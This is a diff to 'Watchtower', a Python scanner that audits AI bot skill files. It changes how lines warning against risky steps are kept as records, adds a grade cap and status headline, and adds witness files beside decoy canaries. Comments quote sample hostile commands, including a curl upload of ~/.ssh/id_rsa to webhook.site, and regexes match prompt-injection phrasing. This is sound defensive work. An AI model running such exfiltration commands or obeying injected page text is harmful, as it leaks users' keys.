@@ -132,8 +132,10 @@ def load_rules():
         r = json.load(f)
     for rule in r["rules"]:
         rule["rx"] = re.compile(rule["pattern"])
-    for k in ("write_verbs", "approval_terms", "draft_terms", "schedule_terms", "nodata_terms", "high_freq", "context_guard"):
+    for k in ("write_verbs", "approval_terms", "draft_terms", "schedule_terms", "nodata_terms", "high_freq"):
         r[k] = re.compile(r[k])
+    r["context_guard"] = re.compile(f"(?i)^(?:{r['context_guard']})$")   # matched against one whole word
+    r["guard_filler"] = {k: re.compile(f"(?i)^(?:{v})$") for k, v in r["guard_filler"].items()}
     return r
 
 
@@ -243,21 +245,204 @@ def looks_real_secret(s):
     return True
 
 
-def in_warning(text, m, rules, code_ok=False):
-    """True when the match sits inside defensive prose: negated, quoted, or described as an attack.
-    code_ok: a command in inline backticks is something to run, not a quotation (WT-T017).
-    Piping into curl/wget is the usual send form, so a leading | is not a quotation when code_ok."""
-    lo = max(0, m.start() - 90)
-    before = text[lo:m.start()]
-    sentence_start = max(before.rfind(". "), before.rfind("\n"))
-    before = before[sentence_start + 1:] if sentence_start >= 0 else before
-    after = text[m.end():m.end() + 40]
-    ends_quote = before.rstrip().endswith(("\"", "“", "'", "(", "[") + (() if code_ok else ("`",)))
-    ends_pipe = (not code_ok) and before.rstrip().endswith("|")
-    quoted = ends_quote or ends_pipe
-    scoped = re.match(r"(?i)\s*(inside|in\s+(the|any|this|that)|within|from\s+(the|any)|embedded|contained|found\s+in|that\s+appear)", after)
-    code = re.search(r"(<!--|\[//\]|r\"|\\s[+*]|\(\?i\))", before + after)
-    return bool(quoted or scoped or code or rules["context_guard"].search(before))
+# Hardening batch 2 (review R1): a guarded match is kept as a "Warning or example text" record, never dropped, and the guard is
+# narrow. For these rules a backtick or a leading | is code to run, not a quotation.
+GUARD_CODE_RULES = frozenset(("WT-T004", "WT-T005", "WT-T006", "WT-T017"))
+GUARD_FUNCTION = frozenset("a an the any your my its this that it them to from into as of or nor ever just blindly".split())
+CLAUSE_END = re.compile(r"\.\s|\n|[:;!?](?=\s|$)|\s[-–—]{1,2}\s")
+GUARD_TOKEN = re.compile(r",|[^\s,]+")
+REPORTED = re.compile(r"(?i)\b(if|when)\s+((a|an|the|any|some)\s+)?[\w-]+\s+(says?|tells?|asks?|instructs?)\s+((you|the\s+bot|it)\s+)?"
+                      r"(to\s+)?(?P<rest>(\S+\s+){0,2})$")
+UNTRUSTED_AFTER = re.compile(r"(?i)^\s*(inside|in|within|found\s+in|from|embedded\s+in)\s+((a|an|the|any|this|that|its|your|their|each|every)\s+)?"
+                             r"(web\s+)?(pages?|sites?|websites?|emails?|messages?|documents?|files?|transcripts?|comments?|issues?|"
+                             r"tool\s+outputs?|search\s+results?)\b")
+DESCRIBED_AFTER = re.compile(r"(?i)\btreat\s+(it|this|them|that|these|those)\s+as\s+(untrusted\s+)?data\b|\b(is|are)\s+(an?\s+)?(attack|injection|"
+                             r"prompt[- ]injection)\b|\b(don'?t|do\s+not|never)\s+(follow|obey)\s+(it|this|them|that|these|those)\b")
+
+
+def _clause_before(text, start):
+    """The clause before a match: the partial token glued to it (https://, ~/, an opening backtick, the "an" of "another") is
+    dropped, then the text is cut at a sentence end, a colon, semicolon, ! or ?, or a spaced dash."""
+    before = text[max(0, start - 200):start].replace("’", "'")
+    before = re.sub(r"\S+$", "", before)
+    before = re.sub(r"(?i)\b(e)\.(g)\.|\b(i)\.(e)\.", lambda x: "".join(g for g in x.groups() if g), before)   # e.g. is not a sentence end
+    return CLAUSE_END.split(before)[-1]
+
+
+def _guard_token(t):
+    return t if t == "," else t.strip("*_`\"'“”‘()[]<>").lower()
+
+
+def _negated(clause, rules):
+    """The nearest governing word (a negation, an example word, a describer) governs the verb: reached walking back through at
+    most 3 filler words (run, read, send, data, keys...); function words (the, to, ever...) are free. A comma ends the clause
+    unless it follows the governing word ("Never, ever run") or a filler verb ("never read, send or upload")."""
+    toks = [t for t in (_guard_token(x) for x in GUARD_TOKEN.findall(clause)) if t]
+    gov, verbs, nouns = rules["context_guard"], rules["guard_filler"]["verbs"], rules["guard_filler"]["nouns"]
+    n = 0
+    for i in range(len(toks) - 1, -1, -1):
+        t = toks[i]
+        if t == ",":
+            prev = toks[i - 1] if i else ""
+            if not (gov.match(prev) or verbs.match(prev)):
+                return False
+        elif gov.match(t):
+            return True
+        elif t in GUARD_FUNCTION:
+            continue
+        elif verbs.match(t) or nouns.match(t):
+            n += 1
+            if n > 3:
+                return False
+        else:
+            return False
+    return False
+
+
+SHELL_BEFORE = re.compile(r"(?i)(^|[\s;&|`(])(-c|eval|exec|sh|bash|zsh|dash|sudo|xargs|env|nohup|time|then|do|run|runs|execute|executes)\s*$")
+SHELL_SEP = re.compile(r";|&&|\|\||\$\(|`|\.\s|[!?](\s|$)")
+SENTENCE_END = re.compile(r"[.!?](\s|$)")
+SHELL_ARG = re.compile(r"""-{1,2}[A-Za-z0-9]|['"|<>\\]|\S*(://|[/@=$~])""")
+
+
+def _unquoted(rx, text, i, j):
+    """Where rx first matches in text[i:j] outside shell quoting and escapes, or -1. Fix round 2 (R1): the ; in a quoted
+    'Cookie: a=b;c=d' is part of one argument, not a separator. A quote opens only at the start of a word (an apostrophe in
+    "it's" never hides a separator); inside "...", $( and ` still start another command."""
+    q, k = None, i
+    while k < j:
+        c = text[k]
+        if q == "'":
+            q = None if c == "'" else q
+        elif c == "\\":
+            k += 2
+            continue
+        elif q == '"':
+            if c == '"':
+                q = None
+            elif text.startswith(("$(", "`"), k):
+                return k
+        elif c in "'\"" and (k == i or text[k - 1] in " \t=@:(-"):
+            q = c
+        elif rx.match(text, k, j):
+            return k
+        k += 1
+    return -1
+
+
+def _args_end(text, i):
+    """Fix round 2 (R1): where the shell arguments after a command match end. A flag, a quoted string, a path, a URL or a pipe
+    right after it starts them, and they run to the end of the line (through \\ continuations) or an unquoted sentence end:
+    "curl ... -H 'X-Note: this is an attack'" never describes itself. Prose right after it ("... | bash is an attack") is not one."""
+    if i >= len(text) or re.match(r"[.,:;!?)\]](\s|$)", text[i:i + 2]):
+        return i
+    k = i
+    while k < len(text) and text[k] in " \t":
+        k += 1
+    mid = k == i and i > 0 and not text[i - 1].isspace()   # the match ends inside an argument: webhook.site|/x, id_rsa|'
+    if not mid and not (k < len(text) and SHELL_ARG.match(text, k)):
+        return i
+    while True:
+        b = text.find("\n", k)
+        b = len(text) if b == -1 else b
+        s = _unquoted(SENTENCE_END, text, k, b)
+        if s != -1:
+            return s
+        if not text[k:b].rstrip().endswith("\\") or b == len(text):
+            return b
+        k = b + 1
+
+
+def _shell_quote(tail):
+    """Fix round 1 (R1): a quote or parenthesis that the shell runs is not a quotation: $( ), <( ), a subshell at the start of
+    a clause or after a run word, bash -c "...", eval '...'."""
+    if tail[-1] == "(" and tail[:-1].endswith(("$", "<", ">", "=")):
+        return True
+    pre = tail[:-1].rstrip(" \t")
+    return bool(SHELL_BEFORE.search(pre)) or not CLAUSE_END.split(pre)[-1].strip()
+
+
+def _command_span(text, start):
+    """Where the command holding this match starts, and where it ends: the inline-code span around it, or a bare curl/wget on
+    the same line. None when another command or sentence starts in between (`a; b`, `a && b`, two spans)."""
+    a = text.rfind("\n", 0, start) + 1
+    b = text.find("\n", start)
+    b = len(text) if b == -1 else b
+    seg = text[a:start]
+    if seg.count("`") % 2:
+        s = a + seg.rfind("`") + 1
+        e = text.find("`", start, b)
+        e = b if e == -1 else e + 1
+    else:
+        cm = list(re.finditer(r"(?i)\b(curl|wget)\b", seg))
+        if not cm:
+            return None
+        s = a + cm[-1].start()
+        e = _unquoted(SHELL_SEP, text, start, b)
+        e = b if e == -1 else e
+    return None if _unquoted(SHELL_SEP, text, s, start) != -1 else (s, e)
+
+
+def _after_command(text, m, code_rule):
+    """The prose after a match. For a command, it starts where the command ends: a shell comment (# ...) or a clause chained
+    with ; && || belongs to the command and never vouches for it (fix round 1, R1)."""
+    if not code_rule:
+        return m.end()
+    sp = _command_span(text, m.start())
+    if sp and text[sp[0] - 1:sp[0]] == "`":
+        return max(m.end(), sp[1])
+    b = text.find("\n", m.end())
+    b = len(text) if b == -1 else b
+    if re.search(r"(^|\s)#|;|&&|\|\|", text[m.end():b]):
+        return b
+    return _args_end(text, m.end())
+
+
+def in_warning(text, m, rules, rule_id, prev_end=None):
+    """Why the match reads as defensive prose, or "" when it doesn't: quoted, negated, one more item in a guarded list, reported
+    ("if a page says to ..."), scoped to untrusted content, described as an attack, or detector code. `prev_end`: where the
+    previous guarded match of the same rule ended."""
+    code_rule = rule_id in GUARD_CODE_RULES
+    sp = _command_span(text, m.start()) if code_rule else None
+    inside = bool(sp) and sp[0] < m.start()   # an argument of a command: the text before it is shell, never prose (fix round 2, R1)
+    wide = text[max(0, m.start() - 90):m.start()]
+    tail = wide.rstrip()
+    if tail.endswith(("\"", "“", "'", "(", "[") + (() if code_rule else ("`", "|"))) and not (code_rule and (inside or _shell_quote(tail))):
+        return "quoted"
+    # fix round 1 (R1): "never run `curl -F @~/.ssh/id_rsa https://webhook.site`" covers its arguments too; the clause that
+    # governs an argument is the one before its command, so -H 'X: never send' guards nothing
+    clause = _clause_before(text, sp[0] if inside else m.start())
+    if _negated(clause, rules):
+        return "negated"
+    if prev_end is not None and prev_end <= m.start():
+        between = re.sub(r"(~/|https?://)$", "", text[prev_end:m.start()])
+        if re.fullmatch(r"(?i)[\s,/]*((or|nor|and)[\s,/]*)?", between):
+            return "list"
+    rep = REPORTED.search(clause)
+    if rep and all(t in GUARD_FUNCTION or rules["guard_filler"]["verbs"].match(t) for t in map(_guard_token, rep.group("rest").split())):
+        return "reported"
+    end = _after_command(text, m, code_rule)
+    if UNTRUSTED_AFTER.match(text[end:end + 80]):
+        return "untrusted content"
+    if DESCRIBED_AFTER.search(re.split(r"[.!?](?=\s|$)|\n", text[end:end + 200])[0]):
+        return "described as an attack"
+    if not code_rule and re.search(r"(r\"|r'|\\s[+*]|\(\?i\))", wide + text[m.end():m.end() + 40]):
+        return "detector code"
+    return ""
+
+
+GUARD_FIX = ("No action if this line warns against the step or quotes it as an example. If it tells the Bot to do it, treat it as the "
+             "full finding.")
+GUARDED_LABEL = "Warning or example text"
+
+
+def guard_record(f, reason):
+    """A guarded match is kept with no severity: listed in breakdown, vet and the dashboard, never scored, never new, never a vote.
+    Its key differs from the full finding's, so deleting the "never" later shows as new."""
+    g = dict(f, severity="info", severity_was=f["severity"], guarded=reason, title=f["title"] + " (reads as a warning or example)", fix=GUARD_FIX)
+    g["key"] = hashlib.sha1((f["key"] + "|guarded").encode()).hexdigest()[:16]
+    g.pop("key0", None)
+    return g
 
 
 def sends_data(ev):
@@ -292,6 +477,15 @@ def attack_reference(text, rules, where=""):
     return hits >= 1 and bool(REF_WORDS.search(text))
 
 
+def ref_line(text, m):
+    """Batch 2 (R1): in a reference file a credential read, an exfiltration host or a pipe-to-shell is lowered only when its own
+    line describes an attack or is a table row. One "attacker" elsewhere in the file no longer lowers a real command."""
+    a = text.rfind("\n", 0, m.start()) + 1
+    b = text.find("\n", m.end())
+    line = text[a:b if b != -1 else len(text)]
+    return bool(REF_WORDS.search(line)) or line.lstrip().startswith("|")
+
+
 def sentence_of(text, m):
     a = max(text.rfind(c, 0, m.start()) for c in ".!?\n") + 1
     ends = [i for i in (text.find(c, m.end()) for c in ".!?\n") if i != -1]
@@ -313,15 +507,14 @@ def scan_text(text, where, rules, kind="skill"):
         if kind == "vendor" and rule["severity"] != "critical" and rule["id"] != "WT-T002":
             if not (rule["id"] in BEHAVIOR_RULES and rule["severity"] in ("critical", "high")):
                 continue
+        prev_end = None
         for m in rule["rx"].finditer(text):
-            if is_ref and rule["id"] in REF_RULES:
+            if is_ref and rule["id"] in REF_RULES and (rule["id"] not in GUARD_CODE_RULES or ref_line(text, m)):
                 out.append(finding(rule["id"], rule["title"] + " (in an attack-pattern reference)", "low", rule["owasp"],
                                    f"{where}:{line_of(text, m.start())}", f"U+{ord(m.group(0)):04X}" if rule["id"] == "WT-T002" else m.group(0)[:140],
                                    "Documentation or detector text. Confirm the file is what it claims to be."))
                 if rule["id"] == "WT-T002":
                     break
-                continue
-            if rule["id"] in guarded and in_warning(text, m, rules, code_ok=rule["id"] == "WT-T017"):
                 continue
             if rule["id"] == "WT-T017" and not sends_data(text[m.start():m.start() + 400]):
                 continue   # look past the short regex match so -G with @ or $(...) still counts; later | tr -d stays out
@@ -333,18 +526,21 @@ def scan_text(text, where, rules, kind="skill"):
                 continue
             ev = m.group(0)
             if rule["id"] == "WT-T006" and known_installer(ev):
-                out.append(finding("WT-T006k", "Known installer piped to shell", "medium" if kind != "vendor" else "low",
-                                   ["ASI05", "AST02"], f"{where}:{line_of(text, m.start())}", ev[:140],
-                                   "A well-known installer, but still unpinned. Prefer a package manager or a pinned, checksummed download."))
-                continue
-            if rule["id"] == SECRET_RULE:
-                ev = mask(ev)
-            elif rule["id"] == "WT-T002":
-                ev = f"U+{ord(ev):04X}"
-            elif rule["id"] == "WT-T003":
-                ev = ev[:24] + f"… ({len(m.group(0))} chars)"
-            out.append(finding(rule["id"], rule["title"], rule["severity"], rule["owasp"],
-                               f"{where}:{line_of(text, m.start())}", ev, rule["fix"]))
+                f = finding("WT-T006k", "Known installer piped to shell", "medium" if kind != "vendor" else "low",
+                            ["ASI05", "AST02"], f"{where}:{line_of(text, m.start())}", ev[:140],
+                            "A well-known installer, but still unpinned. Prefer a package manager or a pinned, checksummed download.")
+            else:
+                if rule["id"] == SECRET_RULE:
+                    ev = mask(ev)
+                elif rule["id"] == "WT-T002":
+                    ev = f"U+{ord(ev):04X}"
+                elif rule["id"] == "WT-T003":
+                    ev = ev[:24] + f"… ({len(m.group(0))} chars)"
+                f = finding(rule["id"], rule["title"], rule["severity"], rule["owasp"], f"{where}:{line_of(text, m.start())}", ev, rule["fix"])
+            reason = in_warning(text, m, rules, rule["id"], prev_end) if rule["id"] in guarded else ""
+            if reason:   # batch 2 (R1): downgraded to a record, never dropped
+                f, prev_end = guard_record(f, reason), m.end()
+            out.append(f)
             if rule["id"] in ("WT-T002",):
                 break  # one per file is enough for invisible chars
     writes = first_action(text, rules["write_verbs"])
@@ -504,7 +700,7 @@ def dedupe(findings):
     return out
 
 
-SCORE_ERA = "s4"   # bump when the formula changes; older history is then hidden instead of compared
+SCORE_ERA = "s5"   # bump when the formula changes; older history is then hidden instead of compared
 SCORE_BASE = {"critical": 12, "high": 5, "medium": 1.5, "low": 0.3}   # per kind of risk
 SCORE_CAP = {"critical": 50, "high": 25, "medium": 12, "low": 3}      # per severity tier
 
@@ -636,8 +832,8 @@ def corroborated(f, findings):
     loud = lambda g: (g.get("severity_was") or g["severity"]) in ("critical", "high")
     fk = kinds_of(f)
     for g in findings:
-        if g is f or g["rule"] in NO_OPINION:
-            continue                            # a scanner that didn't finish says nothing about the content (DQ-014)
+        if g is f or g["rule"] in NO_OPINION or g.get("guarded"):
+            continue                            # a scanner that didn't finish says nothing about the content (DQ-014); defensive text backs up nothing
         gp, gk = _place(g), kinds_of(g)
         other = is_evidence(g) or g.get("source", "watchtower") != src
         if g["rule"] == "WT-I004" and _covers(gp, here):
@@ -800,7 +996,9 @@ def label_findings(findings, covered=None):
     out = []
     for f in findings:
         f = dict(f)
-        if (f["rule"] in TIP_RULES or f["rule"] in SCOPE_RULES or f.get("fact_only") or covered_by_ask_first(f, covered)
+        if f.get("guarded"):   # batch 2 (R1): defensive wording, kept as a record with no severity
+            _no_severity(f, "guarded", GUARDED_LABEL)
+        elif (f["rule"] in TIP_RULES or f["rule"] in SCOPE_RULES or f.get("fact_only") or covered_by_ask_first(f, covered)
                 or plain_cookie_jar(f)):
             _no_severity(f, "tip", TIP)
         elif is_evidence(f):
@@ -951,7 +1149,46 @@ def score(findings):
     penalty = sum(min(SCORE_CAP[k], v) for k, v in tiers.items())
     s = max(0, 100 - round(penalty))
     grade = "A" if s >= 90 else "B" if s >= 80 else "C" if s >= 65 else "D" if s >= 50 else "F"
-    return s, grade
+    return s, cap_grade(grade, status_of(findings))   # batch 2 (R5): the grade says what to do; the number is the trend
+
+
+def cap_grade(grade, st):
+    """Act now is grade F; Check this week is at most C."""
+    if st == ACT_NOW:
+        return "F"
+    return "C" if st == CHECK_WEEK and grade in ("A", "B") else grade
+
+
+ACT_NOW, CHECK_WEEK, ALL_GOOD = "Act now", "Check this week", "All good"
+
+
+def status_of(findings):
+    """The headline (hardening batch 2, R5): one Confirmed critical is "Act now", one Confirmed high "Check this week", whatever
+    the number says. Pass the scored findings (`scored(live)`): accepted, platform, roll-call and grouped ones are already out."""
+    sev = {f["severity"] for f in findings if label_of(f) == CONFIRMED}
+    return ACT_NOW if "critical" in sev else CHECK_WEEK if "high" in sev else ALL_GOOD
+
+
+def snap_status(snap):
+    """An older snapshot without a status gets one from its findings."""
+    return snap.get("status") or status_of(scored(snap.get("findings") or []))
+
+
+def snap_grade(snap):
+    """The grade to show. An older snapshot (no status) kept the grade of its day, so the cap is applied when it is read; its
+    number stays as it was."""
+    g = (snap or {}).get("grade", "")
+    return g if not snap or "status" in snap or not g else cap_grade(g, snap_status(snap))
+
+
+def status_line(snap):
+    """'Act now — 1 confirmed critical problem'"""
+    st = snap_status(snap)
+    sev = "critical" if st == ACT_NOW else "high" if st == CHECK_WEEK else None
+    if not sev:
+        return st
+    n = sum(1 for f in scored(snap.get("findings") or []) if f["severity"] == sev and label_of(f) == CONFIRMED)
+    return f"{st} — {n} confirmed {sev} problem{'' if n == 1 else 's'}" if n else st
 
 
 def verdict(findings):
@@ -1457,6 +1694,8 @@ def owned_path(p, kind, log=True):
             ok = _under(rp, {os.path.realpath(r) for r in user_skill_roots()}, strict=True) and _under(n, user_skill_roots(), strict=True)
         elif kind == "decoy":
             allowed = decoy_places() | {os.path.normpath(os.path.expanduser(x)) for x in OLD_CANARY_PATHS}
+            if os.path.basename(n) == WITNESS:   # the witness beside a decoy (batch 2)
+                allowed = {os.path.join(os.path.dirname(x), WITNESS) for x in allowed}
             d = os.path.dirname(n)
             ok = n in allowed and not os.path.islink(d) and os.path.realpath(d) == os.path.join(os.path.realpath(os.path.dirname(d)), os.path.basename(d))
         elif kind == "workspace-skill":   # DQ-021: a skill copy in the workspace that two engines flag; never platform or Watchtower folders
@@ -1863,7 +2102,7 @@ def audit(roots, exports, quick=False):
         fs += soft("SkillSpector and husk", ("WT-X001", "WT-X002", "WT-X003", "WT-X004"), notes, [], engine_findings,
                    user_dirs + sorted(changed) + other_dirs, fs, notes, user_roots, budget=max(0, min(ENGINE_BUDGET, time_left() - 20)))
         set_progress("finishing", 0, 0)
-        rearm_canaries()  # Watchtower's own scanners just read every file; reset so only other readers trip them
+        rearm_canaries(within=roots)  # Watchtower's own scanners just read the files under roots; reset only those (batch 2, R2)
     else:
         # The daily check re-scans what changed and then works through anything still waiting, two minutes at most.
         rest = [d for d in user_dirs + sorted(os.path.dirname(x) for x in inv["skills"] if skill_tier(x) != "user") if d not in changed]
@@ -3345,7 +3584,7 @@ def mark_platform(fs):
     Confirmed (it is still shown and still alerts when new) but never counts. Two engines agreeing on a platform skill in words
     that name no dangerous behavior is a Platform line too (DQ-042)."""
     for f in fs:
-        if f.get("scope") != "platform":
+        if f.get("scope") != "platform" or f.get("guarded"):
             continue
         if f.get("class") in ("pattern", "tip") or f.get("platform_hook") or unconfirmed_platform_vote(f, fs):   # Ken, Oct 13: the platform's hook is a Platform line
             f["class"], f["label"] = "platform", PLATFORM
@@ -3652,7 +3891,7 @@ def take_lock(wait=0):
 
 
 def note_run_window(t_start):
-    runs = [r for r in load_json(state_path("run_windows.json"), []) if r[1] > time.time() - 3 * 86400][-60:]
+    runs = [list(r) for r in run_windows() if r[1] > time.time() - 3 * 86400][-60:]
     runs.append([t_start, time.time()])
     save_json(state_path("run_windows.json"), runs)
 
@@ -3716,7 +3955,8 @@ def run_audit_locked(args, quick):
     note_earlier_auto_allow(prev, live)
     prev_keys, cur_keys = keys_of(prev.get("findings", [])), keys_of(live)
     new = [f for f in live if not known(f, prev_keys) and (f["severity"] != "info" or f.get("class") == "pattern")]
-    fixed = [f for f in prev.get("findings", []) if not known(f, cur_keys) and f["rule"] != REFRESH_RULE]   # a summary going away fixes nothing
+    fixed = [f for f in prev.get("findings", []) if not known(f, cur_keys) and f["rule"] != REFRESH_RULE   # a summary going away fixes nothing
+             and not f.get("guarded")]                                                                # nor does a warning-text record
     s, g = score(scored(live))
     if meta["baseline_status"] == "first":
         save_baseline(meta["manifest"])
@@ -3728,7 +3968,7 @@ def run_audit_locked(args, quick):
             drifted = {skill_root(f["where"].split(":")[0]) for f in expand_groups(fs) if f["rule"] in ("WT-I001", "WT-I002", "WT-I003")}
             save_approved_all([d for d in meta.get("skill_dirs", []) if os.path.normpath(d) not in drifted and not os.path.exists(approved_path(d))])
     # "reset": nothing is saved or approved; WT-I010 stays open every run until the owner's yes (`wt.py baseline --owner-said-yes`)
-    snapshot = {"at": now(), "version": VERSION, "score": s, "grade": g, "previous_score": prev.get("score"), "findings": live, "suppressed": suppressed,
+    snapshot = {"at": now(), "version": VERSION, "status": status_of(scored(live)), "score": s, "grade": g, "previous_score": prev.get("score"), "findings": live, "suppressed": suppressed,
                 "scanners_missing": meta.get("scanners_missing", []), "stages_skipped": list(STAGE_FAILED),
                 "inventory": meta["inventory"], "notes": meta["notes"]}
     save_json(state_path("last_findings.json"), snapshot)
@@ -3791,9 +4031,9 @@ def cmd_audit(args):
     except Busy:
         print("ERROR another Watchtower run has been going for 15 minutes; try again when it finishes (`wt.py status`)", file=sys.stderr)
         return 2
-    out = {"score": snap["score"], "score_line": score_line(snap), "grade": snap["grade"], "new": [compact(f) for f in new][:20],
+    out = {"status": snap_status(snap), "score": snap["score"], "score_line": score_line(snap), "grade": snap_grade(snap), "new": [compact(f) for f in new][:20],
            "fixed": [compact(f) for f in fixed][:10], "open_by_severity": by_sev(snap["findings"]),
-           "top_fixes": [compact(f) for f in snap["findings"] if f.get("scope") != "platform"][:3], "notes": snap["notes"], "inventory": snap["inventory"]}
+           "top_fixes": [compact(f) for f in snap["findings"] if f.get("scope") != "platform" and not f.get("guarded")][:3], "notes": snap["notes"], "inventory": snap["inventory"]}
     out.update(score_change(snap, new))
     exc = exceptions_active(snap)
     if exc:
@@ -3810,7 +4050,10 @@ def cmd_audit(args):
     tips = [f for f in snap["findings"] if f.get("class") == "tip"]
     if tips:
         out["tips"] = [compact(f) for f in tips][:10]
-    plat = [f for f in snap["findings"] if f.get("scope") == "platform"]
+    warn = sum(1 for f in snap["findings"] if f.get("guarded"))
+    if warn:   # batch 2 (R1): defensive wording kept as records; `wt.py breakdown` lists them
+        out["warning_text_count"] = warn
+    plat = [f for f in snap["findings"] if f.get("scope") == "platform" and not f.get("guarded")]
     if plat:   # v0.7.1 item 4: Grok Bot's own files, one line each, never scored
         out["platform"] = [f"{f['rule']} {label_of(f)}: {f['title']} at {f['where']}" for f in plat][:8]
     print(fit(out))
@@ -3863,6 +4106,7 @@ def cmd_daily(args):
         print(f"NO_CHANGES_BUT_NOT_CHECKED {'; '.join(gap)[:300]}: these were not checked this run (last results kept)" if gap else "NO_CHANGES")
         return 0
     out = {"score": snap["score"], "score_line": score_line(snap)}
+    out["status"] = snap_status(snap)
     if gap:
         out["not_checked_this_run"] = gap
     out.update(score_change(snap, new))
@@ -4075,11 +4319,12 @@ def trend(hist):
 
 
 def render_md(snap, hist, tag):
-    plat = [f for f in shown(snap["findings"]) if f.get("scope") == "platform"]   # v0.7.1 item 4: their own section, never scored
-    fs = [f for f in shown(snap["findings"]) if f.get("scope") != "platform"]
+    warn = [f for f in shown(snap["findings"]) if f.get("guarded")]   # batch 2 (R1): one count line, never a finding
+    plat = [f for f in shown(snap["findings"]) if f.get("scope") == "platform" and not f.get("guarded")]   # v0.7.1 item 4: their own section, never scored
+    fs = [f for f in shown(snap["findings"]) if f.get("scope") != "platform" and not f.get("guarded")]
     c = by_sev(fs)
-    lines = [f"# Watchtower report {tag}", "",
-             f"Score {score_line(snap)} (grade {snap['grade']}), {trend(hist)}. Open findings: "
+    lines = [f"# Watchtower report {tag}", "", f"Status: {status_line(snap)}", "",
+             f"Score {score_line(snap)} (grade {snap_grade(snap)}), {trend(hist)}. Open findings: "
              f"{c['critical']} critical, {c['high']} high, {c['medium']} medium, {c['low']} low.", "",
              "## Top fixes", ""]
     for i, f in enumerate(fs[:3], 1):
@@ -4107,6 +4352,9 @@ def render_md(snap, hist, tag):
         for f in lows:
             by_rule[(f["rule"], f["title"])] = by_rule.get((f["rule"], f["title"]), 0) + 1
         lines += ["", "Hygiene notes (low): " + "; ".join(f"{t} ×{n}" for (r, t), n in sorted(by_rule.items(), key=lambda x: -x[1]))]
+    if warn:
+        lines += ["", f"{GUARDED_LABEL}: {len(warn)} line{'' if len(warn) == 1 else 's'} that warn against a risky step or quote it as an "
+                  "example. Not findings, not in the score. `wt.py breakdown` lists them."]
     if plat:
         lines += ["", "## Platform", "", "Grok Bot's own files. Not in the score."]
         lines += [f"- {f['rule']} {label_of(f)}: {f['title']} at `{f['where']}`. {f['fix']}" for f in plat[:40]]
@@ -4138,7 +4386,8 @@ def extra_sections(fs):
     """Worth a look and Tips: listed below the findings, with no severity."""
     out = ""
     for cls, head, note in (("pattern", MAYBE_FINE, "Pattern matches nothing else backs up. No severity, not in the score."),
-                            ("tip", "Tips", "Best practice, not problems. No severity, not in the score.")):
+                            ("tip", "Tips", "Best practice, not problems. No severity, not in the score."),
+                            ("guarded", GUARDED_LABEL, "Lines that warn against a risky step or quote it as an example. Not findings, not in the score.")):
         items = [f for f in fs if f.get("class") == cls][:40]
         if items:
             out += (f"<details><summary>{html.escape(head)} ({len(items)})</summary><p class='mut'>{note}</p><ul>"
@@ -4169,7 +4418,7 @@ h1{{font-size:20px;margin:0 0 4px}}.mut{{color:var(--mut)}}.row{{display:flex;ga
 table{{border-collapse:collapse;width:100%;font-size:13px}}td,th{{border-bottom:1px solid var(--line);padding:8px;text-align:left;vertical-align:top}}
 .sev{{color:#fff;border-radius:4px;padding:2px 6px;font-size:11px;text-transform:uppercase}}.wrap{{overflow-x:auto}}code{{font-size:12px}}
 </style></head><body><h1>Watchtower · {tag}</h1><div class='mut'>Generated {html.escape(snap['at'])} · read-only audit of this Grok Bot computer</div>
-<div class='row'><div class='card'><div class='mut'>Posture score</div><div class='big'>{snap['score']}<span class='mut' style='font-size:18px'>/100 · {snap['grade']}</span></div><div class='mut'>{html.escape(score_line(snap))}</div><div class='mut'>{trend(hist)}</div></div>
+<div class='row'><div class='card'><div class='mut'>Status</div><div style='font-size:24px;font-weight:700'>{html.escape(status_line(snap))}</div><div class='mut'>Posture score</div><div class='big'>{snap['score']}<span class='mut' style='font-size:18px'>/100 · {snap_grade(snap)}</span></div><div class='mut'>{html.escape(score_line(snap))}</div><div class='mut'>{trend(hist)}</div></div>
 <div class='card'><div class='mut'>Score, last {len(pts)} runs</div><svg width='{w}' height='{h}' viewBox='0 0 {w} {h}' role='img' aria-label='score trend'><polyline fill='none' stroke='#2e86c1' stroke-width='2' points='{poly}'/></svg></div>
 {tiles}</div><h2 style='font-size:16px'>Open findings</h2><div class='wrap'><table><tr><th>Severity</th><th>Finding</th><th>Where</th><th>OWASP</th><th>Fix</th></tr>{rows or "<tr><td colspan=5>Nothing open.</td></tr>"}</table></div>
 {extra_sections(fs)}
@@ -4187,10 +4436,10 @@ def remember_events(new):
     store = load_json(state_path("events.json"), [])
     known = {e["key"] for e in store}
     for f in new:
-        if f["rule"] in BULK_KEYS:
-            old = [e for e in store if e["rule"] == f["rule"]]
+        if f["key"] in BULK_KEYS:
+            old = [e for e in store if e["key"] == f["key"]]
             n = sum(e.get("times", 1) for e in old) + 1
-            store = [e for e in store if e["rule"] != f["rule"]]
+            store = [e for e in store if e["key"] != f["key"]]
             ev = f["evidence"] + (f"; {n} times in the last {EVENT_DAYS} days" if n > 1 else "")
             store.append(dict(f, evidence=ev[:220], times=n, first_seen=now()))
         elif f["key"] not in known:
@@ -4345,7 +4594,8 @@ def write_decoy(p, content):
     """Write a decoy without ever following a link. The decoys live in /tmp and /var/tmp, where every Bot can write, so a link
     planted at the decoy's folder or file would make Watchtower overwrite whatever it points to. The decoy's own folder and file
     are opened with O_NOFOLLOW from an open handle on the folder above, and every check is made on the opened handle, never on
-    the name, so nothing can be swapped in between the check and the write. Returns (atime, mtime) after re-arming."""
+    the name, so nothing can be swapped in between the check and the write. Returns (atime, mtime, {ino, ctime_ns}) after
+    re-arming: the last two say later whether the file's times were set by hand (fix round 1)."""
     folder, fn = os.path.split(p)
     base, sub = os.path.split(folder)
     os.makedirs(base, exist_ok=True)                  # /tmp, /var/tmp (or the test root): the system's own folders
@@ -4373,11 +4623,125 @@ def write_decoy(p, content):
         st = os.fstat(fd)
         os.utime(fd, (st.st_mtime - 86400, st.st_mtime))  # atime < mtime so the next read updates atime
         st = os.fstat(fd)
-        return st.st_atime, st.st_mtime
+        return st.st_atime, st.st_mtime, decoy_ident(st)
     finally:
         for x in (fd, dfd, bfd):
             if x is not None:
                 os.close(x)
+
+
+# Hardening batch 2 (R2): the backup's fingerprint. Next to each decoy sits a witness file with mode 000. Every Bot runs as the
+# same user as Watchtower: it can't read the witness without chmod, or move its read time without utime, and both stamp a new
+# ctime no unprivileged process can set back; recreating it changes its inode. Only a privileged reader (the platform's backup)
+# moves its atime and nothing else. A learned pattern (time of day, file count) could be copied: every Bot can read this state.
+WITNESS = ".lock"
+WITNESS_SLACK = 2   # seconds: the witness must be read with the decoy, not later
+
+
+def _decoy_dir_fd(folder):
+    """An open handle on a decoy folder, never reached through a link."""
+    base, sub = os.path.split(folder)
+    bfd = os.open(base, os.O_RDONLY | os.O_DIRECTORY)
+    try:
